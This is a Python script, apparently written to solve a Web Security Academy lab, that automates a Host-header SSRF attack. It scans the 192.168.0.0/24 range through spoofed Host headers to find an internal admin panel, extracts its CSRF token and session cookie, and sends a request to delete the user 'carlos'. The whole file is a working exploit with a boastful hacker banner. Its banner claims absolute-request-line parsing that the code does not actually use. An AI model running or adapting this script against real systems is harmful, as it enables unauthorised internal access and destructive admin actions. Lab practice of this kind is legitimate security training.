#!/usr/bin/env python3
# === GANGA OPS: Flawed Request Parsing SSRF Fully Automated ===

import requests
import re
import time
from urllib.parse import urlparse
from colorama import Fore, Style, init
init(autoreset=True)

def banner():
    print(f"""\n{Fore.RED}=== 🔥 GANGA SSRF: Absolute URL Bypass & Auto-Exploit ==={Style.RESET_ALL}
{Fore.CYAN}>>> Shadow Junior 😈 | SSRF via Absolute Request Line Parsing
>>> Objective: Internal Admin Panel Discovery → CSRF Token Theft → carlos Deletion\n""")

def get_lab_url():
    try:
        url = input("🔗 Enter the full lab URL (e.g., https://xyz.web-security-academy.net): ").strip()
        if not url.startswith("https://"):
            raise ValueError("Invalid HTTPS URL format.")
        return url.rstrip('/')
    except Exception as e:
        print(f"[!] URL Input Error: {e}")
        exit(1)

def probe_internal_admin(base_url):
    parsed = urlparse(base_url)
    for i in range(256):
        ip = f"192.168.0.{i}"
        url = f"https://{parsed.netloc}/"
        headers = {
            "Host": ip
        }
        try:
            r = requests.get(url, headers=headers, allow_redirects=False, timeout=5)
            if r.status_code == 302 and "/admin" in r.headers.get("Location", ""):
                print(f"{Fore.GREEN}[✓] Internal admin panel redirect found via Host: {ip}")
                return ip
            elif "Admin interface" in r.text or "csrf" in r.text:
                print(f"{Fore.YELLOW}[!] Possible internal admin page detected via {ip}")
                return ip
        except:
            continue
    print(f"{Fore.RED}[✗] Failed to locate internal admin in 192.168.0.0/24. Try manually.")
    exit(1)

def access_admin_page(base_url, ip):
    print(f"{Fore.CYAN}[*] Accessing /admin using Host: {ip}")
    headers = {
        "Host": ip
    }
    url = f"{base_url}/admin"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            cookie = r.cookies.get('session')
            csrf = re.search(r'name="csrf"\s+value="(.+?)"', r.text)
            if csrf:
                print(f"{Fore.GREEN}[+] CSRF token: {csrf.group(1)}")
                return csrf.group(1), cookie
            else:
                print(f"{Fore.RED}[✗] CSRF token not found.")
                exit(1)
        else:
            print(f"{Fore.RED}[✗] Failed to access /admin (Status: {r.status_code})")
            exit(1)
    except Exception as e:
        print(f"[!] Admin access error: {e}")
        exit(1)

def delete_carlos(base_url, ip, csrf, session):
    headers = {
        "Host": ip,
        "Cookie": f"session={session}"
    }
    target_url = f"{base_url}/admin/delete?csrf={csrf}&username=carlos"
    print(f"{Fore.MAGENTA}[•] Sending delete request for carlos...")
    try:
        r = requests.post(target_url, headers=headers, timeout=10)
        if "Congratulations" in r.text or r.status_code == 200:
            print(f"{Fore.GREEN}[💥] carlos deleted. Lab solved.")
        else:
            print(f"{Fore.RED}[✗] carlos deletion may have failed.")
            print(r.text[:500])
    except Exception as e:
        print(f"[!] Deletion request failed: {e}")

def main():
    banner()
    base_url = get_lab_url()
    ip = probe_internal_admin(base_url)
    csrf, session = access_admin_page(base_url, ip)
    delete_carlos(base_url, ip, csrf, session)

if __name__ == "__main__":
    main()
